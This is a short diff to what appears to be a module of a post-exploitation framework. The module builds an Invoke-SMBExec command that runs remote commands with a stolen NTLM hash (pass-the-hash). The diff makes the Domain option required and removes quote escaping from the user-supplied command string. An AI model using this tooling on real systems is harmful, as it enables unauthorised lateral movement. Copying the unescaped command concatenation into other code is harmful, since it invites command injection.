@@ -62,8 +62,8 @@ class Module(object):
             },
             'Domain' : {
                 'Description'   :   'Domain.',
-                'Required'      :   False,
-                'Value'         :   ''
+                'Required'      :   True,
+                'Value'         :   '.'
             },
             'Hash' : {
                 'Description'   :   'NTLM Hash in LM:NTLM or NTLM format.',
@@ -195,7 +195,7 @@ class Module(object):
             Cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
 
         else:
-            Cmd = '%COMSPEC% /C start /b ' + command.replace('"','\\"')
+            Cmd = '%COMSPEC% /C start /b ' + command
             print(helpers.color("[*] Running command:  " + Cmd))
 
         scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, Cmd)
